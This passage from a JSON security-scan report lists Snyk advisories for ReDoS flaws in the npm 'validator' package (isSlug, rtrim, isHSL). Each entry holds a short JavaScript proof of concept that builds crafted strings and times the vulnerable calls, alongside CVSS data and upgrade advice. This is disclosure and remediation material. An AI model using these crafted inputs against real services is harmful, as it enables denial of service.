          "desc": "## Overview\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `isSlug` function\r\n\r\n### PoC\r\n```\r\nvar validator = require(\"validator\")\r\nfunction build_attack(n) {\r\n\tvar ret = \"111\"\r\n\tfor (var i = 0; i < n; i++) {\r\n\t\tret += \"a\"\r\n\t}\r\n\r\n\treturn ret+\"_\";\r\n}\r\nfor(var i = 1; i <= 50000; i++) {\r\n    if (i % 10000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n       validator.isSlug(attack_str)\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n   }\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `validator` to version 13.6.0 or higher.\n## References\n- [GitHub Commit](https://github.com/tux-tn/validator.js/commit/b21879cf45c05ee11b2d79e612b651bf7b2d93b7#diff-f41087599986e29c3c0dc15b62f1bf96d8aba16fe41f3730e315c84c2c4cb311)\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1596)\n- [GitHubPR - Actual fix](https://github.com/validatorjs/validator.js/pull/1738)\n- [GitHub PR - Initial fix](https://github.com/validatorjs/validator.js/pull/1603)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-04-05T12:57:03.048070Z\",\n  \"credit\": [\n    \"Yeting Li\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `isSlug` function\\r\\n\\r\\n### PoC\\r\\n```\\r\\nvar validator = require(\\\"validator\\\")\\r\\nfunction build_attack(n) {\\r\\n\\tvar ret = \\\"111\\\"\\r\\n\\tfor (var i = 0; i < n; i++) {\\r\\n\\t\\tret += \\\"a\\\"\\r\\n\\t}\\r\\n\\r\\n\\treturn ret+\\\"_\\\";\\r\\n}\\r\\nfor(var i = 1; i <= 50000; i++) {\\r\\n    if (i % 10000 == 0) {\\r\\n        var time = Date.now();\\r\\n        var attack_str = build_attack(i)\\r\\n       validator.isSlug(attack_str)\\r\\n        var time_cost = Date.now() - time;\\r\\n        console.log(\\\"attack_str.length: \\\" + attack_str.length + \\\": \\\" + time_cost+\\\" ms\\\")\\r\\n   }\\r\\n}\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `validator` to version 13.6.0 or higher.\\n## References\\n- [GitHub Commit](https://github.com/tux-tn/validator.js/commit/b21879cf45c05ee11b2d79e612b651bf7b2d93b7#diff-f41087599986e29c3c0dc15b62f1bf96d8aba16fe41f3730e315c84c2c4cb311)\\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1596)\\n- [GitHubPR - Actual fix](https://github.com/validatorjs/validator.js/pull/1738)\\n- [GitHub PR - Initial fix](https://github.com/validatorjs/validator.js/pull/1603)\\n\",\n  \"disclosureTime\": \"2021-04-05T12:54:38Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"13.6.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-VALIDATOR-1090599\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-11-02T09:54:37.437536Z\",\n  \"moduleName\": \"validator\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"validator\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-04-26T16:18:45Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/tux-tn/validator.js/commit/b21879cf45c05ee11b2d79e612b651bf7b2d93b7%23diff-f41087599986e29c3c0dc15b62f1bf96d8aba16fe41f3730e315c84c2c4cb311\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/validatorjs/validator.js/issues/1596\"\n    },\n    {\n      \"title\": \"GitHubPR - Actual fix\",\n      \"url\": \"https://github.com/validatorjs/validator.js/pull/1738\"\n    },\n    {\n      \"title\": \"GitHub PR - Initial fix\",\n      \"url\": \"https://github.com/validatorjs/validator.js/pull/1603\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<13.6.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"validator@13.5.2\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"validator@13.6.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"validator\",\n  \"version\": \"13.5.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , validator@13.5.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2021-3765"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-VALIDATOR-1090600",
          "desc": "## Overview\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `rtrim` function.\r\n\r\n### PoC\r\n```\r\nvar validator = require(\"validator\")\r\nfunction build_attack(n) {\r\n\tvar ret = \"\"\r\n\tfor (var i = 0; i < n; i++) {\r\n\t\tret += \" \"\r\n\t}\r\n\r\n\treturn ret+\"◎\";\r\n}\r\nfor(var i = 1; i <= 50000; i++) {\r\n    if (i % 10000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n       validator.rtrim(attack_str)\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n   }\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `validator` to version 13.7.0 or higher.\n## References\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1599)\n- [GitHub PR](https://github.com/validatorjs/validator.js/pull/1603)\n- [GitHub PR #2](https://github.com/validatorjs/validator.js/pull/1738)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-04-05T12:59:35.520598Z\",\n  \"credit\": [\n    \"Yeting Li\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `rtrim` function.\\r\\n\\r\\n### PoC\\r\\n```\\r\\nvar validator = require(\\\"validator\\\")\\r\\nfunction build_attack(n) {\\r\\n\\tvar ret = \\\"\\\"\\r\\n\\tfor (var i = 0; i < n; i++) {\\r\\n\\t\\tret += \\\" \\\"\\r\\n\\t}\\r\\n\\r\\n\\treturn ret+\\\"◎\\\";\\r\\n}\\r\\nfor(var i = 1; i <= 50000; i++) {\\r\\n    if (i % 10000 == 0) {\\r\\n        var time = Date.now();\\r\\n        var attack_str = build_attack(i)\\r\\n       validator.rtrim(attack_str)\\r\\n        var time_cost = Date.now() - time;\\r\\n        console.log(\\\"attack_str.length: \\\" + attack_str.length + \\\": \\\" + time_cost+\\\" ms\\\")\\r\\n   }\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `validator` to version 13.7.0 or higher.\\n## References\\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1599)\\n- [GitHub PR](https://github.com/validatorjs/validator.js/pull/1603)\\n- [GitHub PR #2](https://github.com/validatorjs/validator.js/pull/1738)\\n\",\n  \"disclosureTime\": \"2021-04-05T12:43:44Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"13.7.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-VALIDATOR-1090600\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-3765\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-11-04T16:13:50.818043Z\",\n  \"moduleName\": \"validator\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"validator\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-04-26T16:18:44Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/validatorjs/validator.js/issues/1599\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/validatorjs/validator.js/pull/1603\"\n    },\n    {\n      \"title\": \"GitHub PR #2\",\n      \"url\": \"https://github.com/validatorjs/validator.js/pull/1738\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<13.7.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"validator@13.5.2\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"validator@13.7.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"validator\",\n  \"version\": \"13.5.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , validator@13.5.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-VALIDATOR-1090601",
          "desc": "## Overview\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `isHSL` function.\r\n\r\n### PoC\r\n```\r\nvar validator = require(\"validator\")\r\nfunction build_attack(n) {\r\n\tvar ret = \"hsla(0\"\r\n\tfor (var i = 0; i < n; i++) {\r\n\t\tret += \" \"\r\n\t}\r\n\r\n\treturn ret+\"◎\";\r\n}\r\nfor(var i = 1; i <= 50000; i++) {\r\n    if (i % 1000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n       validator.isHSL(attack_str)\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n   }\r\n}\r\n\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `validator` to version 13.6.0 or higher.\n## References\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1598)\n- [GitHub PR](https://github.com/validatorjs/validator.js/pull/1651)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-04-05T13:13:17.588279Z\",\n  \"credit\": [\n    \"Yeting Li\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `isHSL` function.\\r\\n\\r\\n### PoC\\r\\n```\\r\\nvar validator = require(\\\"validator\\\")\\r\\nfunction build_attack(n) {\\r\\n\\tvar ret = \\\"hsla(0\\\"\\r\\n\\tfor (var i = 0; i < n; i++) {\\r\\n\\t\\tret += \\\" \\\"\\r\\n\\t}\\r\\n\\r\\n\\treturn ret+\\\"◎\\\";\\r\\n}\\r\\nfor(var i = 1; i <= 50000; i++) {\\r\\n    if (i % 1000 == 0) {\\r\\n        var time = Date.now();\\r\\n        var attack_str = build_attack(i)\\r\\n       validator.isHSL(attack_str)\\r\\n        var time_cost = Date.now() - time;\\r\\n        console.log(\\\"attack_str.length: \\\" + attack_str.length + \\\": \\\" + time_cost+\\\" ms\\\")\\r\\n   }\\r\\n}\\r\\n\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to 